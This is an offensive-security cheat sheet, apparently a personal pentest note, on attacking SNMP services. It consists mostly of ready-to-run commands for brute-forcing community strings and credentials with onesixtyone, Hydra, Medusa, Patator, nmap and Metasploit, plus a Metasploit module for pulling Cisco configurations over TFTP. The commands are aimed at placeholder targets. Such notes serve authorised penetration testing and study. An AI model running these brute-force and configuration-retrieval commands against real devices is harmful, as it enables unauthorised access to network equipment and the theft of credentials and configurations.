---
author(s):
  - Userware
tags:
  - vulnerability-assessment
  - initial-access
  - password-cracking
  - network-ports
  - onesixtyone
  - hydra
  - medusa
  - patator
  - network-mapper
  - metasploit-framework
---
# SNMP

## 01 - Brute Force Community Strings

```
$ cat > community.txt << EOF
public
private
manager
EOF

$ onesixtyone -c community.txt -i ip_targets.txt -o output.txt -w 100
```

## 02 - Retrieve Credentials

### 2.1 - Cisco

```
msf > use auxiliary/scanner/snmp/cisco_config_tftp

msf auxiliary(scanner/snmp/cisco_config_tftp) > options

msf auxiliary(scanner/snmp/cisco_config_tftp) > set rhosts <IP>

msf auxiliary(scanner/snmp/cisco_config_tftp) > run
```

## 03 - Brute Force Credentials

### 3.1 - OneSixtyOne

```
$ onesixtyone <IP> -c passwords.lst
```

### 3.2 - Hydra

TODO: Fill this info

`$ hydra -U snmp`

```
$ hydra -P passwords.lst <IP> snmp
```

### 3.3 - Medusa

```
$ medusa -M snmp -h <IP> -u <username> -P passwords.lst
```

### 3.4 - Patator

```
$ patator snmp_login host=<IP> version=3 user=<username> auth_key=FILE0 0=passwords.lst -x ignore:mesg=unknownUserName

$ patator snmp_login host=<IP> version=3 user=<username> auth_key=FILE0 0=passwords.lst -x ignore:mesg=wrongDigest
```

### 3.5 - Network Mapper

```
$ sudo nmap -sU -p 161,162 -n --script snmp-brute --script-args "snmp-brute.communitiesdb=passwords.lst" <IP
```

### 3.6 - Metasploit

```
msf > use auxiliary/scanner/snmp/snmp_login

msf auxiliary(scanner/snmp/snmp_login) > options

Module options (auxiliary/scanner/snmp/snmp_login): 

   Name              Current Setting                                       Required  Description 
   ----              ---------------                                       --------  ----------- 
   BLANK_PASSWORDS   false                                                 no        Try blank passwords for all users 
   BRUTEFORCE_SPEED  5                                                     yes       How fast to bruteforce, from 0 to 5 
   DB_ALL_CREDS      false                                                 no        Try each user/password couple stored in the current database 
   DB_ALL_PASS       false                                                 no        Add all passwords in the current database to the list 
   DB_ALL_USERS      false                                                 no        Add all users in the current database to the list 
   DB_SKIP_EXISTING  none                                                  no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm) 
   PASSWORD                                                                no        The password to test 
   PASS_FILE         /opt/metasploit/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line 
   RHOSTS                                                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit 
   RPORT             161                                                   yes       The target port 
   STOP_ON_SUCCESS   false                                                 yes       Stop guessing when a credential works for a host 
   THREADS           1                                                     yes       The number of concurrent threads (max one per host) 
   USER_AS_PASS      false                                                 no        Try the username as the password for all users 
   VERBOSE           true                                                  yes       Whether to print output for all attempts 
   VERSION           1                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)

msf auxiliary(scanner/snmp/snmp_login) > set rhosts <IP>

msf auxiliary(scanner/snmp/snmp_login) > set pass_file passwords.lst

msf auxiliary(scanner/snmp/snmp_login) > set stop_on_success true

msf auxiliary(scanner/snmp/snmp_login) > run -j

msf auxiliary(scanner/snmp/snmp_login) > creds
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xF - Remote Services Exploitation/Network Ports/Telnet|Initial Access: Telnet]]

### Hacking Articles

- [Hacking Articles: Password Cracking SNMP](https://www.hackingarticles.in/password-crackingsnmp/)

### Penetration Testing Tools

- [Penetration Testing Tools: Hydra Protocols](https://en.kali.tools/?p=220)

### Mike Bond

- [Mike Bond: Cisco SNMP Secrets](https://bond-o.medium.com/cisco-snmp-secrets-e4b731b19737)